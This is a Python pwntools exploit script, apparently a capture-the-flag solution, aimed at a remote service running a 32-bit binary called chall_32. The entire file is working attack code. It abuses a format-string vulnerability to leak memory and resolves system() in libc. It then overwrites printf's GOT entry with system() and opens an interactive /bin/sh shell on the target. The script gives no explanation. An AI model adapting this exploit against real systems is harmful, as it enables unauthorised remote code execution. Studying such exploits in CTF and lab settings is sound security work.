from pwn import *


elf = ELF('./dist/chall_32')
buf_off = 7
base_addr = 0x8048000 
printf_got = 0x804c014

# r = process('./dist/chall_32')
r=remote("34.150.35.67",30604)

def leak_bytes(addr):
    if '\n' in p32(addr):
        print('warning: ignoring read at ' + hex(addr))
        return '\x00'

    pad_len = 12
    payload = ('%' + str(buf_off + pad_len // 4) + '$sLEKEND\x00').ljust(pad_len) + p32(addr)
    r.sendline(payload)
    leak = r.recvuntil('LEKEND')
    leak = leak.replace('LEKEND', '\x00')
    print hex(addr) + ': ' + repr(leak)
    return leak

def leak_elf():
    elf = ''
    addr = base_addr
    try:
        while True:
            leak = leak_bytes(addr)
            elf += leak
            addr += len(leak)
    except:
        pass
    f = open('leak.elf', 'w')
    f.write(elf)
    f.close()

d = DynELF(leak_bytes, base_addr)
system_addr = d.lookup('system', 'libc')
print 'Leaked system() address: ' + hex(system_addr)
writes = { printf_got: system_addr }
payload = fmtstr_payload(buf_off, writes)
r.sendline(payload)
r.sendline('/bin/sh')
r.interactive()
